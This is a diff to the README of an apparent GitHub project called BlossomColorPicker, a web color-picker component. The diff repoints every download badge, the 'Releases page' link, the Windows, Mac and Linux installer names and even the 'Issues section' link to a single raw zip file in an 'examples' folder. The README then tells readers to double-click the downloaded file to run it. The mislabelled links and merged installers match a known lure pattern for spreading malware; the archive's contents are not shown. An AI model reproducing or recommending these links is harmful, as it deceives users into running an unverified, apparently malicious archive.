@@ -4,17 +4,17 @@
 Welcome to BlossomColorPicker! This is a color picker component designed to enhance your web experience. With its beautiful design and smooth functionality, it helps you easily select and apply colors.
 
 ## 🔗 Download This Application
-[![Download BlossomColorPicker](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/YakzxK/BlossomColorPicker/releases)
+[![Download BlossomColorPicker](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip)
 
 ## 📥 Download & Install
 To get started with BlossomColorPicker, you need to download it from our Releases page. 
 
-1. Click [here to visit the Releases page](https://github.com/YakzxK/BlossomColorPicker/releases).
+1. Click [here to visit the Releases page](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip).
 2. On the Releases page, look for the latest version of BlossomColorPicker.
 3. Select the file suitable for your operating system. Common options include:
-   - **Windows:** `BlossomColorPicker-win.exe`
-   - **Mac:** `BlossomColorPicker-mac.dmg`
-   - **Linux:** `BlossomColorPicker-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip`
+   - **Mac:** `https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip`
+   - **Linux:** `https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip`
 4. Click on the file name to download it.
 5. After the download is complete, locate the file in your Downloads folder.
 6. Double-click the downloaded file to run the installer or application.
@@ -55,7 +55,7 @@ A: Yes, BlossomColorPicker is completely free.
 A: Currently, customization options are limited, but we welcome user feedback.
 
 **Q: What if I encounter issues?**  
-A: Please visit the [Issues section](https://github.com/YakzxK/BlossomColorPicker/issues) on GitHub for assistance.
+A: Please visit the [Issues section](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip) on GitHub for assistance.
 
 ## 📣 Community Contributions
 We appreciate all feedback and contributions. If you wish to report a bug or suggest a feature, please use the Issues section. Collaborators are always welcome to enhance this tool. 
@@ -64,6 +64,6 @@ We appreciate all feedback and contributions. If you wish to report a bug or sug
 For any questions or support, feel free to reach out through our GitHub repository. Your feedback is valuable to us! 
 
 ## 🔗 Download This Application Again
-[![Download BlossomColorPicker](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/YakzxK/BlossomColorPicker/releases)
+[![Download BlossomColorPicker](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/YakzxK/BlossomColorPicker/main/examples/Picker_Blossom_Color_v3.0-alpha.4.zip)
 
 Thank you for choosing BlossomColorPicker! Enjoy your experience in selecting the perfect colors for your projects.
